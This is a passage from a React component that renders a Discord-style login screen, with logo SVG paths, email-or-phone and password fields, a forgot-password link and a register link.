            <path d="M111.129 7.30884H112.363V8.20809H112.408C112.671 7.68662 113.189 7.20514 114.001 7.20514C115.331 7.20514 115.791 8.11814 115.791 9.29058V12.4392H114.557V9.64209C114.557 8.78261 114.309 8.20809 113.559 8.20809C112.81 8.20809 112.363 8.85664 112.363 9.76158V12.4392H111.129V7.30884Z" fill="white"/>
            <path d="M119.458 7.20514C120.788 7.20514 121.247 8.11814 121.247 9.29058V12.4392H120.013V9.64209C120.013 8.78261 119.765 8.20809 119.016 8.20809C118.266 8.20809 117.82 8.85664 117.82 9.76158V12.4392H116.586V7.30884H117.82V8.20809H117.864C118.128 7.68662 118.646 7.20514 119.458 7.20514Z" fill="white"/>
            <path d="M123.492 10.374C123.492 8.84161 124.701 7.20514 126.571 7.20514C128.442 7.20514 129.65 8.84161 129.65 10.374C129.65 11.9063 128.442 13.5428 126.571 13.5428C124.701 13.5428 123.492 11.9063 123.492 10.374ZM128.371 10.374C128.371 9.34909 127.756 8.20809 126.571 8.20809C125.387 8.20809 124.771 9.34909 124.771 10.374C124.771 11.399 125.387 12.5399 126.571 12.5399C127.756 12.5399 128.371 11.399 128.371 10.374Z" fill="white"/>
          </svg>
        </div>

        <h1 style={{ fontSize: '24px', fontWeight: 600, marginBottom: '8px', color: '#f2f3f5' }}>
          Welcome back!
        </h1>
        <p style={{ color: '#b5bac1', marginBottom: '20px', fontSize: '16px' }}>
          We&apos;re so excited to see you again!
        </p>

        <form onSubmit={handleSubmit(onSubmitLogin)}>
          <div>
            <label style={labelStyle}>
              Email or Phone Number<span style={{ color: '#fa777c', marginLeft: '2px' }}>*</span>
            </label>
            <input
              {...register('email', { required: true })}
              style={inputStyle}
              onFocus={(e) => e.currentTarget.style.borderColor = '#5865f2'}
              onBlur={(e) => e.currentTarget.style.borderColor = '#1e1f22'}
            />
          </div>

          <div>
            <label style={labelStyle}>
              Password<span style={{ color: '#fa777c', marginLeft: '2px' }}>*</span>
            </label>
            <input
              type="password"
              {...register('password', { required: true })}
              style={inputStyle}
              onFocus={(e) => e.currentTarget.style.borderColor = '#5865f2'}
              onBlur={(e) => e.currentTarget.style.borderColor = '#1e1f22'}
            />
          </div>

          <span onClick={() => setStep('forgot')} style={linkStyle}>
            Forgot your password?
          </span>

          <button
            type="submit"
            disabled={loading}
            style={{ ...buttonStyle, opacity: loading ? 0.7 : 1 }}
          >
            {loading ? 'Logging in...' : 'Log In'}
          </button>
        </form>

        <div style={{ textAlign: 'left', marginTop: '8px', fontSize: '14px', color: '#949cf7' }}>
          Need an account? <a href="#" style={{ color: '#949cf7', textDecoration: 'none', fontWeight: 500 }}>Register</a>
        </div>
      </div>
    </div>
  );
}
